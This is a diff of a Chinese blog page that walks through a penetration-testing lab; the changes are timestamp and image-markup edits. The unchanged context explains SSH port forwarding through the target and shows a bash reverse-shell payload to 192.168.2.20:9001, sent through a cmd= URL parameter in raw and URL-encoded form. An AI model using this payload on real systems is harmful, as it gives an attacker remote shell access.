@@ -61,7 +61,7 @@
 <meta property="og:image" content="https://pic.imgdb.cn/item/662b8a360ea9cb14032a32d8.jpg">
 <meta property="og:image" content="https://pic.imgdb.cn/item/662b8a360ea9cb14032a32f3.jpg">
 <meta property="article:published_time" content="2024-04-26T10:50:26.000Z">
-<meta property="article:modified_time" content="2024-04-26T13:04:40.510Z">
+<meta property="article:modified_time" content="2024-04-26T13:18:19.372Z">
 <meta property="article:author" content="AyMeow">
 <meta property="article:tag" content="靶场复现">
 <meta name="twitter:card" content="summary_large_image">
@@ -109,11 +109,11 @@
 
 
 
-<div class="article banner top">
+<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/662b8b670ea9cb14032cb04a.jpg">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">靶场复现</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-04-26T10:50:26.000Z">2024-04-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-04-26T13:04:40.510Z">2024-04-26</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-04-26T10:50:26.000Z">2024-04-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-04-26T13:18:19.372Z">2024-04-26</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -271,7 +271,8 @@
 <p>其中SSH Client为Kali，SSH Server为靶机，结合命令来解释即是：从任意主机（当然也包括自己）发往主机A（也就是Kali）的端口9999的流量都会通过主机B（也就是靶机），发往主机C（也就是上文的localhost）；然后又因为流量都是通过主机B（靶机）发送出去的，也就是说这个”localhost“是以主机B的身份访问的，回包亦然；经过如此操作，那么就可以在Kali上访问自己的9000端口来收到收到命令执行的信息。</p>
 </blockquote>
 <p>执行以上命令后，再开一个窗口监听反弹shell的端口，然后再开一个窗口对自身的9000端口进行访问，即使用反弹Shell的语句：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/662b8a350ea9cb14032a32b3.jpg" alt="DK-31"></p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/662b8a350ea9cb14032a32b3.jpg" data-fancybox="true" alt="DK-31" />
+
 <p>反弹shell的语句需要经过url编码一下：<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Url">Url转换小工具</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/?cmd=bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.20/9001 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:9999/?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.2.20%2f9001+0%3e%261%22</span><br></pre></td></tr></table></figure>
 
@@ -606,7 +607,7 @@
   });
 </script><script>
   ctx.fancybox = {
-    selector: `.timenode p>img, img`,
+    selector: `.timenode p>img`,
     css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
     js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
   };
